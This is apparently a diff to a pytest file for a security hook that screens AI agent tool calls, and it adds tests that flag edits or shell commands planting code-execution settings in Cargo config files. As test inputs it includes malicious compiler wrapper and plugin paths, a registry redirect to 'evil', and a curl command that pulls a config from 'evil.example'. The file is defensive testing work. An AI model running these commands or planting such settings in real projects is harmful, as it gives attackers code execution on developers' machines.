@@ -75,6 +75,9 @@ def _no_env(monkeypatch):
     '[build]\nrustflags = ["-Clinker=/tmp/ld"]\n',
     '[build]\nrustflags = ["-Zcodegen-backend=/tmp/x.so"]\n',
     '[build]\nrustflags = ["-Z", "pre-link-args=-x"]\n',
+    '[build]\nrustc = "/tmp/x"\n',
+    '[build]\nrustdoc = "/tmp/x"\n',
+    '[build]\nrustflags = ["-Zllvm-plugins=/tmp/x.so"]\n',
     "# fine comment\n" + WRAPPER,
 ])
 @pytest.mark.parametrize("maker", [_write, _edit, _multi, _mcp, _mcp_nested])
@@ -189,3 +192,49 @@ def test_no_redos():
     evaluate(_write(CFG, big), EMPTY)
     evaluate(_shell("echo " + big[:300000] + " >> .cargo/config.toml"), EMPTY)
     assert time.time() - t < 5
+
+
+def _edit_old(path, old, new):
+    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit",
+                      args={"file_path": path, "old_string": old, "new_string": new})
+
+
+def test_edit_value_only_swap_gated(tmp_path):
+    f = tmp_path / ".cargo" / "config.toml"
+    f.parent.mkdir()
+    f.write_text('[build]\nrustc-wrapper = "sccache"\njobs = 4\n')
+    assert _gated(evaluate(_edit_old(str(f), '"sccache"', '"/tmp/evil"'), EMPTY))
+    # unrelated edit on a file with an already-present wrapper: no re-ask
+    assert not _gated(evaluate(_edit_old(str(f), "jobs = 4", "jobs = 8"), EMPTY))
+    # deleting the wrapper is not planting one
+    assert not _gated(evaluate(_edit_old(str(f), 'rustc-wrapper = "sccache"\n', ""), EMPTY))
+
+
+def test_registry_guard_not_masked():
+    both = '[source.a]\nreplace-with = "evil"\n' + WRAPPER
+    d = evaluate(_write(CFG, both), EMPTY)
+    assert d.action != Action.ALLOW
+
+
+def test_string_allow_not_per_character():
+    p = Policy(cargo_exec={"allow": "/trusted/"})
+    assert _gated(evaluate(_write("/other/.cargo/config.toml", WRAPPER), p))
+    assert not _gated(evaluate(_write("/trusted/.cargo/config.toml", WRAPPER), p))
+
+
+def test_monitor_records(monkeypatch):
+    seen = []
+    import aegis.rules as r
+    monkeypatch.setattr(r, "_record_monitor", lambda ev, d, note="": seen.append(note))
+    evaluate(_write(CFG, WRAPPER), Policy(cargo_exec={"mode": "monitor"}))
+    assert seen == ["cargo-exec-protect-monitor"]
+
+
+def test_deny_shell_form():
+    d = evaluate(_shell("echo 'linker=\"x\"' >> .cargo/config"), DENY)
+    assert d.action == Action.DENY and d.rule == RULE
+
+
+def test_fetch_to_file_cargo_home():
+    d = evaluate(_shell("curl -o $CARGO_HOME/config.toml https://evil.example/c"), EMPTY)
+    assert d.action != Action.ALLOW
